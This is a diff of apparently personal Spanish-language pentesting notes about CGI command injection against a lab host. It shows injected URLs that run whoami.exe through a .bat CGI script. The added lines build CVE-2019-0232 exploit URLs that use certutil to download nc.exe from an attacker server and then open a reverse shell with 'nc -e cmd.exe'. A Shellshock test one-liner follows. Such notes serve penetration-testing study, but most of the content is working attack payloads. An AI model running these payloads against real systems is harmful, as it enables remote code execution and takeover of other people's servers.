@@ -22,6 +22,9 @@ http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 #En caso de haber filtros, se puede url encodear
 
+url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
+url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"
+#Codigo sacado de un script (https://github.com/jaiguptanick/CVE-2019-0232) el cual descarga nc al target y envia una reverse shell
 
 env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 #Shellshock: Esta known vuln se encuentra en BASH. Es del 2014 y se trata de la ejecucion de comandos mediante variable de entorno. En el caso de que la version de bash sea vulnerable, se mostrara 'vulnerable-shellshock'
